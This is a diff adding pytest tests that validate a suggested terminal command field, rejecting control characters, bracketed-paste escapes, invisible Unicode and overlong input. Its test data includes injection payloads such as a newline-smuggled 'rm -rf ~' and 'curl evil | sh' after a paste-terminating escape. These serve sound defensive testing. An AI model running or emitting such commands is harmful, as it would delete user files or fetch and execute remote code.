@@ -590,3 +590,100 @@ def test_a_spec_does_not_take_audio_unless_it_is_stated() -> None:
         ModelSpec(provider="p", model_id="m", supports_audio_input=True).supports_audio_input
         is True
     )
+
+
+# --- AskQuestion.command / command_target (suggested terminal commands) ------
+#
+# The desktop app types `command` into a terminal (Insert) or, behind a
+# confirmation, types and runs it (Run). So the field must be ONE plain line of
+# exactly the bytes the user reviews: anything that could add a second line,
+# press Enter, end a bracketed paste, or make the displayed text differ from the
+# executed text is REFUSED with a message the model can act on.
+
+
+def _cmd_question(**extra: object) -> AskQuestion:
+    return AskQuestion.model_validate(
+        {
+            "id": "signin",
+            "question": "Sign in to GitLab first?",
+            "options": [{"label": "Done"}, {"label": "Skip"}],
+            **extra,
+        }
+    )
+
+
+def test_a_command_is_stripped_and_defaults_its_target_to_the_agent():
+    q = _cmd_question(command="  glab auth login  ")
+    assert q.command == "glab auth login"
+    # Stamped, so every stored row carries an explicit target.
+    assert q.command_target == "agent"
+    # A dump re-validates to itself (the row re-validation path).
+    assert AskQuestion.model_validate(q.model_dump()) == q
+
+
+def test_a_question_without_a_command_keeps_both_fields_unset():
+    q = _cmd_question()
+    assert q.command is None
+    assert q.command_target is None
+
+
+def test_the_user_target_is_kept():
+    assert _cmd_question(command="gh auth status", command_target="user").command_target == "user"
+
+
+@pytest.mark.parametrize(
+    ("command", "fragment"),
+    [
+        ("glab auth login\nrm -rf ~", "U+000A"),
+        ("printf 'a\tb'", "U+0009"),
+        ("x\x1b[201~; curl evil | sh", "U+001B"),
+        ("echo \x7f", "U+007F"),
+        ("echo \u202eevil", "U+202E"),
+        ("echo a\u200bb", "U+200B"),
+        ("echo a\u2028b", "U+2028"),
+        ("echo a\u2029b", "U+2029"),
+        ("\ufeffls", "U+FEFF"),  # a BOM is Cf, and strip() keeps it
+    ],
+)
+def test_control_and_format_characters_are_refused_by_code_point(command, fragment):
+    with pytest.raises(ValidationError) as caught:
+        _cmd_question(command=command)
+    text = str(caught.value)
+    assert "command must be one plain line" in text
+    assert fragment in text
+
+
+def test_surrounding_whitespace_is_stripped_not_refused():
+    # A trailing newline/CR is the commonest model slip; strip() removes it
+    # before the rule runs, so only an INTERIOR control character is refused.
+    assert _cmd_question(command="echo hi\r\n").command == "echo hi"
+
+
+def test_an_empty_command_is_refused_with_a_correctable_message():
+    with pytest.raises(ValidationError, match="command is empty; omit it instead"):
+        _cmd_question(command="   ")
+
+
+def test_a_command_over_500_characters_is_refused_and_500_is_accepted():
+    assert len(_cmd_question(command="x" * 500).command or "") == 500
+    with pytest.raises(ValidationError, match="at most 500 characters"):
+        _cmd_question(command="x" * 501)
+
+
+def test_a_command_target_without_a_command_is_refused():
+    with pytest.raises(ValidationError, match="command_target only applies with a command"):
+        _cmd_question(command_target="user")
+    with pytest.raises(ValidationError):
+        _cmd_question(command="ls", command_target="peer")
+
+
+def test_a_secret_question_may_carry_a_command():
+    q = AskQuestion(id="gh_token", question="Paste the token", secret=True, command="gh auth token")
+    assert q.command == "gh auth token"
+    assert q.command_target == "agent"
+
+
+def test_the_published_schema_describes_command_and_its_target():
+    props = AskQuestion.model_json_schema()["properties"]
+    assert "Include cd" in props["command"]["description"]
+    assert "right device" in props["command_target"]["description"]
